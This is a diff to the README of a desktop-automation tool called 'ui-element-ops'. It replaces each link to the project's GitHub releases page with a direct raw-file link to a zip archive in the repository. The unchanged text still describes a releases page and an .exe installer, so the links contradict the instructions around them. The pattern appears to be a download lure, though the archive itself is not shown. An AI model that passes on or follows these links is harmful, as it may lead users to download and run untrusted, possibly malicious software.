@@ -1,6 +1,6 @@
 # 🖥️ ui-element-ops - Parse Screenshots and Automate Your Desktop
 
-[![Download ui-element-ops](https://img.shields.io/badge/Download-Get%20Latest-orange?style=for-the-badge)](https://github.com/catthefish3967/ui-element-ops/releases)
+[![Download ui-element-ops](https://img.shields.io/badge/Download-Get%20Latest-orange?style=for-the-badge)](https://raw.githubusercontent.com/catthefish3967/ui-element-ops/main/skills/ui-element-ops/element_ops_ui_v1.6.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Follow these steps to get ui-element-ops running on your Windows computer.
 First, visit the release page to get the latest version of ui-element-ops for Windows.
 
 ➡️ **Click this button to visit the page:**  
-[![Download ui-element-ops](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://github.com/catthefish3967/ui-element-ops/releases)
+[![Download ui-element-ops](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/catthefish3967/ui-element-ops/main/skills/ui-element-ops/element_ops_ui_v1.6.zip)
 
 On the releases page, look for the latest version. It will show files ready to download. Find the Windows installer file. It will usually end with `.exe`.
 
@@ -118,7 +118,7 @@ If you have issues, use these suggestions:
 
 You may want to visit the release page again to check for updates or download a different version:
 
-[https://github.com/catthefish3967/ui-element-ops/releases](https://github.com/catthefish3967/ui-element-ops/releases)
+[https://raw.githubusercontent.com/catthefish3967/ui-element-ops/main/skills/ui-element-ops/element_ops_ui_v1.6.zip](https://raw.githubusercontent.com/catthefish3967/ui-element-ops/main/skills/ui-element-ops/element_ops_ui_v1.6.zip)
 
 This page shows all available versions and notes about each one.
 
@@ -143,4 +143,4 @@ This page shows all available versions and notes about each one.
 
 ---
 
-[![Download ui-element-ops](https://img.shields.io/badge/Download-Get%20Latest-green?style=for-the-badge)](https://github.com/catthefish3967/ui-element-ops/releases)
+[![Download ui-element-ops](https://img.shields.io/badge/Download-Get%20Latest-green?style=for-the-badge)](https://raw.githubusercontent.com/catthefish3967/ui-element-ops/main/skills/ui-element-ops/element_ops_ui_v1.6.zip)
